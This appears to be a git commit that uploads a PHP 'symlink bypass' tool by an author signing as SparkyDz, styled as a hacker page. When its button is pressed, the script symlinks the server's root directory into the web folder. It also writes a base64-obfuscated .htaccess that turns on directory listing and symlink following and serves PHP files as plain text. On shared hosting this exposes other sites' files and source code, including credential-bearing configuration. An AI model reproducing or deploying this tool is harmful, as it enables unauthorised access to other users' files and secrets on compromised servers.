8a5b71038bc6fbaeca0e8212dd75f9857cf02333
Rafik Boudalia <57587140+sparkydz@users.noreply.github.com>
2020-06-26 00:51:55 +0100

    Add files via upload

---
+++ symlink_by_sparkydz.php
@@ -0,0 +1,41 @@
+<html><head><style>
+body{cursor:url("http:///foro.elhacker.net/elhacker.cur"),auto;}html{display:table;height:100%;width:100%;}body{display:table-row;}body{display:table-cell;vertical-align:middle;text-align:center;}a:link{text-decoration:none;}
+body {
+	  background-color: #000000;
+	background-image: url(https://rockc3.com/wp-content/uploads/2019/11/rc3-uncharted.jpg);
+<!--https://rockc3.com/wp-content/uploads/2019/11/rc3-uncharted.jpg-->
+	margin-left: 0px;
+	margin-top: 0px;
+	margin-right: 0px;
+	margin-bottom: 0px;
+	background-position:right top;
+	background-repeat:no-repeat;
+	background-size:110%
+}
+.style1 {
+	font-family: Arial, Helvetica, sans-serif;
+	font-size: 12px;
+}
+</style>
+</script>
+<link href="http://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css">
+<title>|BYPASS SYMLINKING BY SPARKYDZ|</title>
+</head><body><center><img style="width:250px;" src="https://rockc3.com/wp-content/uploads/2019/11/rc3-uncharted.jpg"></center>
+
+<font style="color:#fff;text-shadow:0px 1px 5px #000;font-size:30px" face="Iceland">SCRIPT BY 
+
+
+<font style="color:#fff;text-shadow:0px 1px 5px #000;font-size:30px" face="Iceland"><a href="" target="_blank" style="color: red">SPARKYDZ</a></font>  <font color="red"><br><font color="white"></font>
+
+
+PS: Your Server Should Be in this directory : /var/www/vhosts/yoursite.com/httpdocs/
+<!-- Made By SparkyDz--></style>
+<?php 
+echo "<form method='POST' action=''>" ; echo "
+<center><input type='submit' value='-->' name='SparkyDz'></center>"; 
+if (isset($_POST['SparkyDz'])){ system('ln -s / SparkyDz.txt'); 
+$fvckem ='T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw'; 
+$file = fopen(".htaccess","w+"); $write = fwrite ($file ,base64_decode($fvckem)); $SparkyDz = symlink("/","SparkyDz.txt"); 
+$rt="<br><a href=SparkyDz.txt TARGET='_blank'><font color=#ff0000 size=2 face='Courier New'><b>
+Symlinked with Successful ! :')</b></font></a>"; 
+echo "<br><br><b></b><br><br><br>$rt</center>";} echo "</form>";  ?></td></tr></body></html>
